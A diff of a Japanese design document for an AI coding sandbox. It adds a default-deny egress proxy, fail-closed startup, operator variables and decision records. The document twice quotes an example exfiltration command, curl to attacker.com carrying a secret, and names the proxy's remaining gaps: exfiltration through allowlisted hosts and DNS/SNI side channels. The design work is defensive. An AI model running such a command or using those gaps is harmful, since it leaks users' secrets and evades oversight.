@@ -73,6 +73,22 @@
 
 **非対象**: コンテナ内の任意コマンド（使い捨てサンドボックス内で完結するためゲートしない。§8 ジャーナルで事後追跡）。
 
+### 2.3 egress proxy（構造ガードの本体）
+
+「危険操作の承認」を捨てた以上、**構造ガードの実体は egress proxy**である。posture A（#495: 封じ込めを本物にする）に基づき、以下の3層で構成する。層は直交しており、上の層が下の層を代替しない。
+
+| 層 | 何を止めるか | 実装 | 設定 |
+|---|---|---|---|
+| ① 経路の封じ込め | SSH・任意 TCP・直接 IP 宛の egress。コンテナは internal network 上にあり、外に出る唯一の経路が HTTP(S) proxy | `internal=True` の Docker network + sidecar | （常時） |
+| ② 宛先の default-deny | allowlist 外のホストへの到達そのもの。`curl https://attacker.com/?d=secret` は 403（#506） | proxy の `EgressGuard.decide_host()` | `SUNABA_ALLOWED_EGRESS_HOSTS`（組み込み既定に**加算**。`*` で無効化） |
+| ③ 書き込み先の allowlist | allowlist 外リポジトリへの push / API write。到達可能でも書き込み権限は別問題 | proxy の push / read / api-write 認可ウィンドウ（#356 / #419 / #420） | `SUNABA_ALLOWED_REPOS` |
+
+**default-on / fail-closed（#509）**: `allow_network=True` のセッションでは proxy が**既定で有効**。明示的な opt-out は `SUNABA_ENABLE_EGRESS_PROXY=false`。sidecar の起動に失敗した場合は `sandbox_initialize` 自体を失敗させる（fail-closed）。「ON のつもりが実は素通し」という #495 が問題視した状態を構造的に作らないための選択であり、sidecar 起動失敗で全セッションが止まるリスクは意図的に受け入れている。
+
+**設定変更の反映（#533）**: sidecar は上記の env を**起動時に一度だけ**読む長寿命コンテナ（`restart_policy=unless-stopped`）。そのため `ensure_egress_proxy()` は再利用時に sidecar の焼き込み env を `docker inspect` で読み戻し、現在の設定と食い違えば**作り直す**。CA は named volume に永続する（#400）ので再作成は稼働中サンドボックスを壊さない。手で `docker rm` する運用手順は存在しない。
+
+**既知の限界**: ② は allowlist 内ホスト経由の exfil（許可済みリポジトリの issue に秘密を書く等）や DNS/SNI サイドチャネルを止めない。casual/arbitrary な egress に対する構造的バリアであって、完全な情報フロー境界ではない（#507 で明記済み）。
+
 ---
 
 ## 3. トークン削減（LLM視点）
@@ -137,7 +153,7 @@
 - **`read_file_range`**: `offset` / `limit` で該当箇所だけ読む。
 - **`write_file_sandbox`（編集の主役）**: 既知の新テキストを渡す宣言的編集。`overwrite` / 行範囲 / `append` / `old_str`（文字列置換）の各モードを束ねる。LLM 著作編集の既定経路。
 - **`lint_in_container` / `type_check_in_container`**: 編集ループ中の単体（単一ファイル）確認用。ruff / pyright。`lint_in_container` は `fix=True` で `ruff check --fix` / `eslint --fix` を対象ファイルに適用し、修正後に残った findings を返す（#284。autofix は単一ファイル限定で、プロジェクト全体の scope フェーズは読み取り専用のまま）。
-- **`verify_in_container`**: 公開前の品質ゲート。pytest の前に lint（プロジェクトの `src/` を素の `ruff check` で。CI と一致）と型チェックを**前提条件**として実行し、どちらかが落ちればテストを走らせず `gate_passed=false` と findings を返す（#293。lint 忘れが CI まで漏れない）。ツール不在（例: `:minimal` イメージ）は `lint_type_incomplete` 扱いでゲートは落とさない。`test_filter`（pytest `-k`）で特定テストだけ実行可能。フィルタ合格時は自動で全件テストを実行し、gate は常に全件ベースで判定。結果に `diff_summary`（`git diff --stat`）を含める。
+- **`verify_in_container`**: 公開前の品質ゲート。pytest の前に lint（プロジェクトの `src/` を素の `ruff check` で。CI と一致）と型チェックを**前提条件**として実行し、どちらかが落ちればテストを走らせず `gate_passed=false` と findings を返す（#293。lint 忘れが CI まで漏れない）。ツール不在（例: `:minimal` イメージ）は `lint_type_incomplete` 扱いでゲートは落とさない。`test_filter`（pytest `-k`）で特定テストだけ実行可能。フィルタ合格時は自動で全件テストを実行し、gate は常に全件ベースで判定。テストランナーは pytest 固定ではなく、検出したプロジェクト言語に応じて pytest（Python）/ jest（JS/TS）/ go test（Go）へディスパッチする（#493、`edit_verify._DISPATCH`）。結果に `diff_summary` を含める。これは `git diff --stat` の**文字列ではなく**、`git diff --numstat` + `--name-status` を解析した構造化 JSON（`unstaged` / `staged`、ファイルごとの追加・削除行数と変更種別）である（#500）。
 
 **編集の2モダリティ（宣言的 / 命令的の直交2本）**
 
@@ -285,8 +301,7 @@ else:
   読み取りは両ファイル (`journal.log.1` → `journal.log`) を透過的に結合する。退避より前の履歴も消えない。
 - **run_id 単位のリプレイ可能トレース出力（HTML / JSON）**: 事後に「なぜそう動いたか」を共有・レビュー。
   最大 100 ファイルまで保持し、超過時は古いものから削除される。
-- **ローカルWebダッシュボード（localhost限定 / read-mostly / 自動更新）**: 稼働コンテナ・run履歴・pass/fail・リソース使用量・承認待ちを一目で。
-- **承認キュー＋ワンクリック Approve/Reject（縮小）**: §2.2 の境界越え操作トークンと連動。ダッシュボードの一機能。
+- **ローカルWebダッシュボード（localhost限定 / read-only / 自動更新）**: 稼働コンテナ・run履歴・pass/fail・リソース使用量を一目で。二段階トークン撤去（§2.2）により承認キューは存在しない。ダッシュボードは事後監査の面であって、実行時ゲートの面ではない。
 - **プッシュ通知（OS通知 / Webhook）**（`notify.py`）: 境界越え操作・失敗閾値超え（既定5回）・長時間実行（既定300秒）のときだけ。OS デスクトップ通知は Linux `notify-send` / macOS `osascript` / Windows PowerShell の3OS対応、Webhook は設定 URL への HTTP POST。閾値・宛先は CLI 引数 `--webhook-url` / `--failure-threshold` / `--long-run-seconds` で調整する。
 - **実行前の人間向けプラン表示**: `publish` で対象ブランチ・差分サマリ・上書き有無を提示。
 
@@ -316,6 +331,7 @@ else:
 | `lint_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
 | `type_check_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
 | `verify_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
+| `diff_in_container` | `record_tool_use` | `tool_use` | 読取専用（構造化 diff） |
 | `package_install` | `record_exec` | `exec` | #361 で追加 |
 | `issue_view` | `record_boundary_crossing`（approved=None）+ `record_exec`（内部で `gh` 呼び出し）| `boundary_crossing` | 読取専用 VCS |
 | `clone_repo` | `record_boundary_crossing`（approved=None）+ `record_exec`（内部の gh clone）| `boundary_crossing` | 読取専用 VCS |
@@ -329,6 +345,11 @@ else:
 | `sandbox_journal_path` | （なし） | — | 読取専用・opt-in（#460） |
 | `sandbox_trace_dir` | （なし） | — | 読取専用・opt-in（#460） |
 | `sandbox_issue_write` | `record_boundary_crossing` | `boundary_crossing` | 境界越え（write、一発実行） |
+| `sandbox_pr_review_write` | `record_boundary_crossing` | `boundary_crossing` | 境界越え（write）。§14 レビューフローの投稿口 |
+| `sandbox_list_containers` | （なし） | — | 読取専用オリエンテーション（#478）。下記の注を参照 |
+| `sandbox_attach` | （なし） | — | 読取専用オリエンテーション（#478）。下記の注を参照 |
+
+`sandbox_list_containers` / `sandbox_attach` は #478（コンテナ共有）で追加されたオリエンテーション系で、境界を越えず、コンテナの状態も変えない（`sandbox_attach` の `session_label` は以降の記録に載る）。現状ジャーナルに記録していないが、これは observability 5ツールのような**明示的な非計装の判断が文書化されていない**まま実装された結果であり、§9.1 冒頭の「すべてのツールは記録しなければならない」に対する未整理の例外である。記録を足すか、非計装を意図として明記するかは別途決める。
 
 読取専用の journal/trace 5ツールは `SUNABA_OBSERVABILITY_TOOLS=1` のときだけ登録される（#460）。記録側（`record_*`）は無条件で動く基盤であり、集計はホスト側で journal.log を直読みすれば足りる。この5ツールは意図的に非計装（#454）: デフォルト無効の観測用デバッグ面であり、journal の読み取りを journal に書くのは自己言及ノイズになる（`sandbox_journal_path` / `sandbox_trace_dir` は container_id 引数自体を持たない）。
 
@@ -357,6 +378,19 @@ V1.0 の棚卸し（#457 / #458）で削除。`run_test_environment` / `stop_tes
 | `SUNABA_TOKEN_BROKER_CACHE_DIR` | `CSB_TOKEN_BROKER_CACHE_DIR` | トークンブローカのキャッシュディレクトリ |
 | `SUNABA_TOKEN_BROKER_NO_DOWNLOAD` | `CSB_TOKEN_BROKER_NO_DOWNLOAD` | トークンブローカのダウンロード抑止 |
 | `SUNABA_SHIORI_REPOS_PATH` | `SHIORI_REPOS_PATH` | Shiori リポジトリルートへのホストパス |
+
+**運用者が設定する変数**（旧名を持たない。§2.3 / §13.1 の実体）
+
+| 変数 | 既定 | 用途 |
+|---|---|---|
+| `SUNABA_ENABLE_EGRESS_PROXY` | **on** | egress proxy の有効化。`false` で opt-out（#509 で意味が反転: opt-in → opt-out） |
+| `SUNABA_ALLOWED_REPOS` | 空（全 push 拒否） | 書き込み先 allowlist（層③）。`owner/repo` のカンマ区切り |
+| `SUNABA_ALLOWED_EGRESS_HOSTS` | 空（組み込み既定のみ） | 宛先ホスト allowlist（層②、#506）。組み込み既定に**加算**。`*` で封じ込め無効化 |
+| `SUNABA_CONTAINER_TTL_SECONDS` | 0（無効） | アイドルコンテナの自動停止 TTL（§13.1、#480） |
+| `SUNABA_PROXY_IMAGE` | pin → `sunaba/proxy:latest` | sidecar イメージの上書き（#432 の digest pin より優先） |
+| `SUNABA_PROXY_CONTROL_HOST_PORT` | 8768 | control API の loopback 公開ポート |
+
+`SUNABA_PROXY_CONTROL_URL` / `SUNABA_PROXY_CONTROL_SECRET` は `ensure_egress_proxy()` がプロセス env に**書き出す**動的変数であり、運用者が設定するものではない。
 
 ---
 
@@ -429,7 +463,9 @@ issue 本文も差分もコンテナ内に留まり、LLM は run_id / ハンド
 | GitHub App 自己管理 | `github_auth.py` | `AppTokenProvider` が Installation Token を発行・キャッシュし、daemon スレッドで定期リフレッシュ（`setup_github_app_token()`） | 秘密鍵をホストに置き、長時間常駐でも短期トークンを切らさない（PR #223） |
 | トークンブローカー | `token_broker.py` | `GITHUB_TOKEN_COMMAND` / `GITHUB_TOKEN_BROKER_SERVICE` 指定時に pin 済み keystore-broker CLI で新鮮な短期トークンを mint（バイナリ pin＋SHA-256 検証＋platformdirs キャッシュ） | 秘密鍵をホストに置かない第3経路（PR #235） |
 
-**優先順位**: ブローカー mint 成功時は静的 `GITHUB_TOKEN` より優先し、失敗時は静的トークンへ fallback する（`token_broker.mint_token()` → `_resolve_vcs_token()`）。いずれも未設定ならトークン無しで、read は匿名クローン、push は credential 無しでクリーンに失敗する。
+**優先順位**: `_resolve_vcs_token()` は **ブローカー mint → `AppTokenProvider`（#474）→ 静的 `GITHUB_TOKEN` / `GH_TOKEN`** の順に解決し、先に成功したものを使う。上位が失敗しても例外にはせず次の経路へ落ちる。いずれも未設定ならトークン無しで、read は匿名クローン、push は credential 無しでクリーンに失敗する。
+
+この順序は「短命なものほど優先」という一貫した基準で決まっている: ブローカーは呼ぶたびに mint する最も短命なトークン、App Installation Token はキャッシュ＋定期リフレッシュ、静的 PAT は最も長命。push 専用ではなく、host→GitHub API の GET（`_resolve_pr_head_ref` / `issue_write`）と proxy の read 認可ウィンドウ（#419）も同じ経路を使う。
 
 ---
 
@@ -625,6 +661,34 @@ diff・テスト出力などのペイロードはコンテナ内に留め、LLM 
 4. README のインストール手順が pin どおりに新規環境で通ることを確認済み
 
 **参照**: #531、#534、#473（本決定が上書きする決定元）、#506、#509、#517
+
+### #495 → #506 (2026-07-07): posture A —— 封じ込めを「本物」にする
+
+**決定**: egress proxy を「push を止める門番」から「**宛先 default-deny の封じ込め**」へ格上げする（posture A）。
+
+**背景**: それまでの proxy は `git push` の宛先だけを見ていた。つまり proxy が ON でも、コンテナから `curl https://attacker.com/?d=$SECRET` は素通しだった（#495）。「proxy を有効にした」という運用者の認識と、実際に封じ込められている範囲が一致していない —— これは設定ミスより質が悪い。**守られていると思い込ませる防御**だからである。
+
+**選択肢と却下理由**:
+- posture B（push だけ守り、exfil は監査で拾う）: ジャーナルは事後追跡であって防御ではない。§8 の「事後監査が安全網の主役」は**コンテナ内で完結する操作**に対する方針であって、外に出ていくバイトに対する方針ではない。
+- posture C（コンテナから一切のネットワークを奪う）: `pip install` / `clone` が死ぬ。使えないサンドボックスは使われず、結果として誰も proxy を使わなくなる。
+
+**結果**: `EgressGuard.decide_host()` を導入し、組み込み既定（github/pypi/npm 系）以外の宛先を 403 で拒否。運用者は `SUNABA_ALLOWED_EGRESS_HOSTS` で**加算**のみできる（既定を設定で消せないのは意図的 —— 消せると「pip が動かない」を理由に allowlist を空にする圧力が働く）。allowlist 内ホスト経由の exfil と DNS/SNI サイドチャネルは**残る限界**として明記した（§2.3）。
+
+**参照**: #495（posture 決定）、#506 / PR #507（実装）
+
+### #509 (2026-07-08): egress proxy の default-on 化
+
+**決定**: `allow_network=True` のセッションで proxy を**既定 ON** にし、`SUNABA_ENABLE_EGRESS_PROXY=false` を明示的な opt-out 経路として残す。sidecar 起動失敗時は fail-closed（`sandbox_initialize` を失敗させる）。
+
+**背景**: #506 で封じ込めが本物になっても、proxy 自体は opt-in のままだった（PR #507 は既定を意図的に変えていない）。ユーザー判断は「**オフにするユースケースの方が少ないはず**」—— proxy を使わない積極的な理由がある方が少数派なら、既定を反転して必要な人だけ opt-out させるべきである。
+
+**fail-closed を選んだ理由**: sidecar 起動失敗時に proxy 無しでネットワークを許可する（fail-open）と、まさに #495 が問題視した「ON のつもりが実は素通し」が再発する。全セッションが sidecar 障害で止まるリスクは受け入れる —— 止まったことは気づけるが、素通しは気づけない。**気づける失敗の方を選ぶ**。
+
+**移行コスト**: 組み込み既定以外の宛先（go modules、cargo、社内 API 等）に依存していたセッションが、既定反転の瞬間に理由不明の 403 で壊れうる。エラーメッセージに `SUNABA_ALLOWED_EGRESS_HOSTS` / `SUNABA_ALLOWED_REPOS` のヒントを含めることで、403 から設定へ辿れるようにした（#401 の「フォールバックで隠さない」と同じ思想）。
+
+**後続**: #519（`ALLOWED_EGRESS_HOSTS` が sidecar に渡っていなかった）、#533（sidecar が起動時 env を保持し続け、設定変更が反映されなかった）。どちらも「env → sidecar の受け渡しが起動時のみ」という同一の根に由来する。default-on 化で全ユーザーの経路上に載ったことで顕在化した。
+
+**参照**: #509、#519、#522、#533
 
 ## まとめ
 
